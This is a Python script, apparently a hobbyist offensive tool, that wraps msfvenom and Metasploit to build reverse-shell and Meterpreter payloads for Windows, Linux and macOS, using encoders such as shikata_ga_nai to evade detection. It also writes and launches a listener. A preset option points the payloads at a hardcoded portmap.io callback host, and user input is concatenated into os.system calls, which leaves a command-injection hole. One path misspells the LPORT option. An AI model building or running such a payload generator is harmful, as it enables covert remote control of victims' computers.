import os
import random
import time
import sys


os.system("clear")
asciiart = "cat misc/asciiart.txt"
os.system(asciiart)
print("\n")
newline = "\n"
design = "######"
randoms = random.randrange(0,66550)

#Checking 
print("Choose 1 for OverTheInternet(portmap.io) or Any number for internal")
over = int(input("Choose: "))



#Lhost and Lport input
print(design)
print("[1] Existing Config For Lhost and Lport")
print("[2] Manual")
print(design)
phopt = int(input("$ "))
if phopt==1:
	Lhost = "hazardxd-42967.portmap.host"
	Lport = "42967"
if phopt==2:
	Lhost = input("[-] Enter Lhost= ")
	Lport = input("[-] Enter Lport= ")
print(design)

os.system("clear")
asciiart = "cat misc/asciiart.txt"
os.system(asciiart)
print("\n")

truecheck = True

def start():
	for x in range(1,85):
		print("-",end="")

	print("\nChoose Option:")
	print("\n[1] Common Payloads\n[2] All Payloads\n\n[0] Handler")

	for x in range(1,85):
		print("-",end="")
	print("\n")

	popt = int(input("$ "))
	print(newline)

	os.system("clear")
	asciiart = "cat misc/asciiart.txt"
	os.system(asciiart)
	print("\n")
	time.sleep(1)


	#handler
	if popt==0:
		if over==1:
			print("Copy ip:")
			os.system("ifconfig tun0")
			Lhost = input("Lhost = ")
			Lport = "9001"
		

		print("\n")
		pload = input("Payload = ")
		
		with open("run.rc",'w',encoding = 'utf-8') as f:
   			f.write("use exploit/multi/handler\n")
   			f.write("set PAYLOAD "+pload+"\n")
   			f.write("set LHOST "+Lhost+"\n")
   			f.write("set LPORT "+Lport+"\n")
   			f.write("exploit")
   		
		print(newline)
		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")
		time.sleep(1)

		print("[-] Exitting Script......")
		print("[-] Starting MetaSploit......")
		truecheck = False
		os.system("clear")
		os.system("msfconsole -r run.rc")
		sys.exit()



	#Start of common
	if popt == 1:
		print(newline)
		print("[-] Options:")
		print(newline)
		print("[1] Windows Meterpreter tcp")
		print("[2] Windows Meterpreter tcp(x64)")
		print("[3] Linux Meterpreter tcp")
		print("[4] Linux Meterpreter x64 single stage")
		print("[5] Mac Reverse Shell")
		print("[0] Back to start")
		print(newline)
		
		optm = int(input("$ "))

		if optm==1:
			Payload = "windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe -e x86/shikata_ga_nai"
			filetype = "exe"
		if optm==2:
			Payload = "windows/x64/meterpreter/reverse_tcp --platform windows -a x64 --encoder x64/xor --iteration 5 -f exe-only"
			filetype = "exe"
		if optm==3:
			Payload = "linux/x86/meterpreter/reverse_tcp --platform linux -a x86"
			filetype = "elf"
		if optm==4:
			Payload = "linux/x64/meterpreter/reverse_tcp --platform linux -a x64"
			filetype = "elf"
		if optm==5:
			Payload = "osx/x86/shell_reverse_tcp --platform osx -a x86"
			filetype = "macho"
		if optm==0:
			os.system("clear")
			asciiart = "cat misc/asciiart.txt"
			os.system(asciiart)
			print("\n")
			start()

		print(newline)
		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")

		command = "msfvenom -p "+Payload+" LHOST="+Lhost+" LPOST="+Lport+" --out output/shell_reverse_tcp_"+str(randoms)+"."+filetype
		print("[-] Creating Payload.......")

		execute = os.system(command)
		print("[-] Payload Created - Going Back To start Menu")
		time.sleep(5)
		

		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")
		time.sleep(2)
		start()

	#start of all
	if popt==2:
		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")
		nnnn = int(input("[-] Press 0 to Go back , Any Number to Continue: "))

		if nnnn==0:
			start()
		
		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")


		print(newline)
		#PLATFORM
		print("Choose platform(Type Full Name) ")
		print("please wait for a moment...")
		com = os.system("msfvenom -l platforms")
		print(newline)
		platform = input("$ ")
		print(newline)

		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")

		#Arch
		print("Choose Arch")
		print("please wait for a moment...")
		comm = os.system("msfvenom -l archs")
		print(newline)
		archs = input("$ ")
		print(newline)

		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")

		#payload
		print("Choose payload: ")
		print("please wait for a moment...")
		com = os.system("msfvenom -l Payloads | grep "+platform+" | grep "+archs)
		print(newline)
		Payloads  = input("$ ")
		print(newline)

		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")

		#Encoders
		print("Choose Encoder")
		print("Please wait for a moment...")
		com = os.system("msfvenom -l encoders")
		print(newline)
		encoders = input("$ ")

		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")

		#FileFormat
		print("Enter FileFormat:")
		print("If You dont know the fromat please search onine or leave it blank..")
		formats = input("$ ")

		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")

		command = "msfvenom -p "+Payloads+" --platform "+platform+" -a "+archs+" -e "+encoders+" LHOST="+Lhost+" LPORT="+Lport+" --out output/Shell"+str(randoms)+"."+formats
		print("[-] Creaating Payload.....")
		execute = os.system(command)
		print("[-] Payload Created - Going Back To start Menu")
		time.sleep(5)
		os.system("clear")
		asciiart = "cat misc/asciiart.txt"
		os.system(asciiart)
		print("\n")
		time.sleep(0.5)
		start()

while truecheck==True:

	start()












